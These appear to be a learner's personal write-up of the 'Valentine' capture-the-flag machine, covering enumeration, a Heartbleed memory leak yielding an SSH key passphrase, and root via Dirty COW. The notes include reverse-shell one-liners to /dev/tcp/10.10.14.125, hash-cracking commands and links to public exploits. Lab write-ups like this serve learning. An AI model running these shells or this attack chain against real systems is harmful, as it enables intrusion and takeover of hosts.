Ran basic nmap, gobuster, etc

gobuster found /dev, which had some notes from the devs about encoding, and a hype key?

opened up cyber chef...its the private key

tried to ssh as admin, root, nothing

gobuster found some new stuff
/encode.php
/decode.php

Checking it out, its just base64 stuff

after taking a look at the ssh stuff I needed a password to use the private key, luckily we can use JTR for that
use ssh2john to get the crackable hash
`ssh2john id_rsa > hash`
then use JTR to crack
`john-the-ripper --wordlist=rockyou.txt hash`

No luck :(

taking a step back and enumerating more we take a look to see if there are any vulnerabilities
`nmap --script vuln -oA nmap/vuln 10.129.244.173`

We get three vulnerabilities:
CCS Injection
Heartbleed
Poodle

Had to research what CCS Injection was
Seems like heartbleed will be the easiest/fastest to try out

found a heartbleed script that exploited it properly! grabbed memory and found some text `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==CK.n...Z.H.l|.....[..............`
Base64 decode gets us `heartbleedbelievethehype` which is prob the password for that private key
tried to ssh using this and the password with:
root
admin
valentine
hype

key is found in `~/Desktop/user.txt`

Interesting stuff:
there is a sqlite file
/home/hype/.gnupg change every 5min
owned by root but we can read /etc/chatscripts/provider, /etc/ppp/peers/provider

ran sudo -l (no permission)
tried to get version (no permission)

Checked the groups
groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)

/usr/sbin/pppd (suid)

owned by root, we search for that and we get a hit for priv esc

echo "/bin/bash -l > /dev/tcp/10.10.14.125/6000 0<&1 2>&1" > reshell.sh
bash -i >& /dev/tcp/10.10.14.125/6000 0>&1

Nothing seemed to work :(, guess I need to try a different route

checking out bash_history we see that there was a tmux session started

searching 3.2.0-23-generic ppriv esc we get:
https://www.exploit-db.com/exploits/33589
https://dirtycow.ninja/

Ran through a buuunch of dirty cow scripts to get something that worked (ended up compiling victim side to get it to work)
https://www.exploit-db.com/exploits/40839
Let me add a priveleged user
Didnt seem to be able to ssh as that user, but was able to just switch over to them
su firefart

got the flag in root!

NOTE: Pretty much everything is going to be a clue, especially images
try to use service versions to enumerate the OS version
if you get an outdated version try to run --script vuln on it to get some possible vulns
there are two ways to get priv esc, try to do both

TODO:
need to improve my enumeration process
learn more about nmap and its capabilities
learn about how heartbleed is actually exploited